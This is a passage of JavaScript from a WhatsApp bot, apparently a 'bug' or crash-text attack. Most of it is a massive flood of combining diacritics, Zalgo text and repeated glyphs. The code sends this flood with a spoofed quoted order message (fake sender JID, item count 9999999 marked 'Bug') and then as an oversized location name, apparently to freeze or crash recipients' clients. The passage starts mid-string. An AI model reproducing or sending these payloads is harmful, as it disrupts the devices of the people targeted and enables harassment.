๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `zoe`,
    orderTitle: `combine`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
zoe.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logobot.jpg')
                     zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥zoe     ̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏